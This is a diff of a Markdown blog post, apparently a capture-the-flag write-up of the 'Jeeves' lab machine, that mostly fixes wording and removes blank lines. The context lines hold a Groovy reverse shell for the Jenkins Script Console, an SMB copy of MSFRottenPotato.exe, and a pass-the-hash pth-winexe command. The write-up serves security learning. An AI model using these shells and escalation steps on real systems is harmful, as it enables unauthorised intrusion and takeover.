@@ -55,7 +55,7 @@ So, after visitin this page and looking around things, in __"Manage Jenkins"__ t
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/script-console.png" alt="Script Console">
 
 ## Reverse Shell
-Knowing that we can do some exploitation with the script console in Jenkins. There are couple methods to get a reverse shell where I'll share two. 
+Knowing that we can do some exploitation with the Script Console in Jenkins. There are couple methods to get a reverse shell where I'll share two. 
 
 ### Reverse Shell - Method #1
 After googling around things such as "jenkins language scripting" or "jenkins reverse shell" there is information that says that the langauage used to execute scripts in the console is called "Groovy". So, from this language the reverse shell obtained came from ["frohoff"](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on github. 
@@ -67,11 +67,11 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-Then, adding this code and replace "localhost" for our IP and cliking "Run" I got a reverse shell!
+Then, adding this code and replace "localhost" for our IP and cliking "Run" we got a reverse shell!
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/reverse-shell1.png" alt="Reverse Shell #1">
 
-and wollah!
+wollah!
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/netcat-shell.png" alt="NetCat Shell #1">
 
@@ -162,7 +162,7 @@ copy \\10.10.14.36\SAM\MSFRottenPotato.exe
 ```
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/rottensmb.png" alt="rottensmb">
 
-Once we have our revershell and MSFRottenPotato.exe files in Jeeves, we can start checking what privileges we have in order to set a parameter before executing MSFRottenPotato.exe. To know the privileges from our machine, we can execute the command:
+Once we have our reverse shell and MSFRottenPotato.exe files in Jeeves, we can start checking what privileges we have in order to set a parameter before executing MSFRottenPotato.exe. To know the privileges from our machine, we can execute the command:
 
 ```
 whoami /priv
@@ -182,7 +182,7 @@ so we have an authority system shell!
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/rottenshell.png" alt="rottenshell">
 
-After running the command, we got authority system! Now it's time to get the flag.
+Now it's time to get the flag.
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/look-deeper.png" alt="look-deeper">
 
@@ -197,36 +197,6 @@ We can't view the flag with a simple ```type``` command, so we must use the comm
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/root.png" alt="root">
 
 and we got root flag!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ### Getting root flag - Method #2
 After looking around in the directories from the user __kohsuke__, there is a file in the Documents directory with __kdbx__ extension. 
@@ -319,16 +289,6 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235f
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/pth-winexe.png" alt="pth-winexe">
 
 After running the command, we got authority system! Now it's time to get the flag.
-
-<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/look-deeper.png" alt="look-deeper">
-
-It was suppose to be a flag in there, but we need to look deeper, so it's time to figure out how to read the flag. So, after reading another posts and googling around, there is a way to read the flag through [Alternative Data Streams](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/) . To list this kind of files we can run the command ```dir /r``` which will list most of the files, in this case our root.flag
-
-<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/before-root.png" alt="before-root">
-
-We can't view the flag with a simple ```type``` command, so we must use the command ```more``` in order to see the root flag.
-
-```more < hm.txt.root.txt```
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/root.png" alt="root">
 
